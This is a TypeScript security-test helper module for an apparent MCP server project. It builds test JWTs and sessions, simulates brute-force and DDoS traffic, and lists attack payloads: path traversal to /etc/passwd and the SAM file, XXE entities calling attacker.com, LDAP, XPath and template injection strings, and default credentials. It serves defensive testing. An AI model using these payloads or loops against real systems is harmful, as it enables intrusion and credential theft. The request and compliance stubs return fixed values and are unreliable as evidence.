/**
 * Security Test Helpers
 * Common utilities and helpers for security testing
 */

import { randomBytes } from 'crypto';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { readFileSync } from 'fs';
import { join } from 'path';

export interface TestSession {
  id: string;
  token: string;
  apiKey?: string;
  cookies?: string[];
  request: (path: string, options?: RequestOptions) => Promise<TestResponse>;
  cleanup: () => Promise<void>;
}

export interface RequestOptions {
  method?: string;
  headers?: Record<string, string>;
  body?: any;
  query?: Record<string, string>;
}

export interface TestResponse {
  status: number;
  body: any;
  headers: Record<string, string>;
}

export class SecurityTestHelpers {
  private static readonly FIXTURES_DIR = join(__dirname, '../fixtures');

  /**
   * Load attack payloads from fixtures
   */
  static getXSSPayloads(): string[] {
    const payloads = JSON.parse(
      readFileSync(join(this.FIXTURES_DIR, 'xss-payloads.json'), 'utf-8')
    );
    return payloads.vectors;
  }

  static getSQLPayloads(): string[] {
    const payloads = JSON.parse(
      readFileSync(join(this.FIXTURES_DIR, 'sql-payloads.json'), 'utf-8')
    );
    return payloads.vectors;
  }

  static getCommandInjectionPayloads(): string[] {
    const payloads = JSON.parse(
      readFileSync(join(this.FIXTURES_DIR, 'command-payloads.json'), 'utf-8')
    );
    return payloads.vectors;
  }

  static getPathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc/passwd',
      '..%c0%af..%c0%af..%c0%afetc/passwd',
      '/var/www/../../etc/passwd',
      'C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '\\\\server\\share\\..\\..\\sensitive',
      'file:///etc/passwd',
      '..%00/etc/passwd',
      '..%0d%0a/etc/passwd',
      '../.\\..\\./etc/passwd',
      '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
      '..././..././..././..././..././..././..././..././etc/passwd',
      '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
      'php://filter/read=convert.base64-encode/resource=../../../etc/passwd'
    ];
  }

  /**
   * Generate test tokens and credentials
   */
  static generateTestJWT(payload: any = {}, options: any = {}): string {
    const defaultPayload = {
      sub: 'test-user-' + randomBytes(8).toString('hex'),
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600,
      roles: ['user'],
      permissions: ['read'],
      ...payload
    };

    return jwt.sign(defaultPayload, process.env.TEST_JWT_SECRET || 'test-secret', {
      algorithm: 'HS256',
      issuer: 'puppeteer-mcp-test',
      audience: 'puppeteer-mcp-api',
      ...options
    });
  }

  static generateTestAPIKey(): string {
    return `pmcp_test_${randomBytes(32).toString('hex')}`;
  }

  static async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 10);
  }

  /**
   * Create test sessions with different privilege levels
   */
  static async createAdminSession(): Promise<TestSession> {
    const token = this.generateTestJWT({
      sub: 'admin-user',
      roles: ['admin'],
      permissions: ['*']
    });

    return this.createTestSession({ token, role: 'admin' });
  }

  static async createUserSession(): Promise<TestSession> {
    const token = this.generateTestJWT({
      sub: 'regular-user',
      roles: ['user'],
      permissions: ['read', 'write']
    });

    return this.createTestSession({ token, role: 'user' });
  }

  static async createGuestSession(): Promise<TestSession> {
    const token = this.generateTestJWT({
      sub: 'guest-user',
      roles: ['guest'],
      permissions: ['read']
    });

    return this.createTestSession({ token, role: 'guest' });
  }

  static async createUnauthenticatedSession(): Promise<TestSession> {
    return this.createTestSession({ token: null, role: 'anonymous' });
  }

  /**
   * Attack simulation helpers
   */
  static async simulateBruteForce(
    endpoint: string,
    attempts: number = 100,
    credentials: Array<{ username: string; password: string }> = []
  ): Promise<{ successful: number; blocked: number; responses: TestResponse[] }> {
    const results = {
      successful: 0,
      blocked: 0,
      responses: [] as TestResponse[]
    };

    const defaultCredentials = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' }
    ];

    const testCredentials = credentials.length > 0 ? credentials : defaultCredentials;

    for (let i = 0; i < attempts; i++) {
      const cred = testCredentials[i % testCredentials.length];
      const response = await this.makeRequest(endpoint, {
        method: 'POST',
        body: cred
      });

      results.responses.push(response);

      if (response.status === 200) {
        results.successful++;
      } else if (response.status === 429) {
        results.blocked++;
      }
    }

    return results;
  }

  static async simulateDDoS(
    target: string,
    duration: number = 5000,
    requestsPerSecond: number = 1000
  ): Promise<{ totalRequests: number; successful: number; failed: number; availability: number }> {
    const results = {
      totalRequests: 0,
      successful: 0,
      failed: 0,
      availability: 0
    };

    const startTime = Date.now();
    const requests: Promise<any>[] = [];

    while (Date.now() - startTime < duration) {
      for (let i = 0; i < requestsPerSecond / 10; i++) {
        requests.push(
          this.makeRequest(target, { method: 'GET' })
            .then(() => results.successful++)
            .catch(() => results.failed++)
        );
        results.totalRequests++;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    await Promise.all(requests);
    results.availability = results.successful / results.totalRequests;

    return results;
  }

  /**
   * Security validation helpers
   */
  static isValidJWT(token: string): boolean {
    try {
      jwt.verify(token, process.env.TEST_JWT_SECRET || 'test-secret');
      return true;
    } catch {
      return false;
    }
  }

  static containsPII(text: string): boolean {
    const piiPatterns = [
      /\b\d{3}-\d{2}-\d{4}\b/,                    // SSN
      /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/, // Credit Card
      /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, // Email
      /\b(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/ // Phone
    ];

    return piiPatterns.some(pattern => pattern.test(text));
  }

  static isSecurePassword(password: string): boolean {
    const requirements = {
      minLength: password.length >= 12,
      hasUppercase: /[A-Z]/.test(password),
      hasLowercase: /[a-z]/.test(password),
      hasNumbers: /\d/.test(password),
      hasSpecial: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password),
      notCommon: !this.isCommonPassword(password)
    };

    return Object.values(requirements).every(req => req === true);
  }

  private static isCommonPassword(password: string): boolean {
    const commonPasswords = [
      'password', '123456', 'password123', 'admin', 'letmein',
      'welcome', 'monkey', '1234567890', 'qwerty', 'abc123'
    ];
    return commonPasswords.includes(password.toLowerCase());
  }

  /**
   * Timing attack prevention helpers
   */
  static async measureTimingVariance(
    operation: () => Promise<any>,
    iterations: number = 1000
  ): Promise<{ mean: number; variance: number; isConstantTime: boolean }> {
    const timings: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      await operation();
      const end = process.hrtime.bigint();
      timings.push(Number(end - start));
    }

    const mean = timings.reduce((a, b) => a + b) / timings.length;
    const variance = timings.reduce((sum, time) => sum + Math.pow(time - mean, 2), 0) / timings.length;
    const stdDev = Math.sqrt(variance);
    const coefficientOfVariation = stdDev / mean;

    return {
      mean,
      variance,
      isConstantTime: coefficientOfVariation < 0.1 // Less than 10% variation
    };
  }

  /**
   * Helper to create test session
   */
  private static async createTestSession(options: any): Promise<TestSession> {
    const sessionId = randomBytes(16).toString('hex');
    
    return {
      id: sessionId,
      token: options.token,
      apiKey: options.apiKey,
      cookies: options.cookies || [],
      request: async (path: string, reqOptions?: RequestOptions) => {
        return this.makeRequest(path, {
          ...reqOptions,
          headers: {
            ...reqOptions?.headers,
            'Authorization': options.token ? `Bearer ${options.token}` : undefined,
            'X-API-Key': options.apiKey,
            'Cookie': options.cookies?.join('; ')
          }
        });
      },
      cleanup: async () => {
        // Cleanup logic here
      }
    };
  }

  /**
   * Make HTTP request (stub - should be implemented with actual HTTP client)
   */
  private static async makeRequest(path: string, options: RequestOptions = {}): Promise<TestResponse> {
    // This should be implemented with actual HTTP client (supertest, axios, etc.)
    // For now, return a stub response
    return {
      status: 200,
      body: {},
      headers: {}
    };
  }

  /**
   * Generate various malicious payloads for testing
   */
  static generateMaliciousPayloads(): {
    xss: string[];
    sql: string[];
    command: string[];
    path: string[];
    xxe: string[];
    ldap: string[];
    xpath: string[];
    template: string[];
  } {
    return {
      xss: this.getXSSPayloads(),
      sql: this.getSQLPayloads(),
      command: this.getCommandInjectionPayloads(),
      path: this.getPathTraversalPayloads(),
      xxe: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]><foo/>',
      ],
      ldap: [
        '*)(uid=*',
        '*)(|(uid=*',
        'admin)(&(password=*)',
        'admin))(|(password=*',
      ],
      xpath: [
        "' or '1'='1",
        "'] | //user[password='",
        "' or count(parent::*[position()=1])=0 or 'a'='b",
      ],
      template: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{constructor.constructor("return process.env")()}}',
      ]
    };
  }

  /**
   * Compliance and audit helpers
   */
  static async verifyNISTControl(
    control: string,
    evidence: any[]
  ): Promise<{ compliant: boolean; gaps: string[] }> {
    // Implement NIST control verification logic
    return {
      compliant: true,
      gaps: []
    };
  }

  static generateComplianceReport(testResults: any[]): {
    summary: any;
    controls: any[];
    recommendations: string[];
  } {
    // Generate compliance report from test results
    return {
      summary: {
        totalControls: 0,
        implemented: 0,
        partial: 0,
        notImplemented: 0
      },
      controls: [],
      recommendations: []
    };
  }
}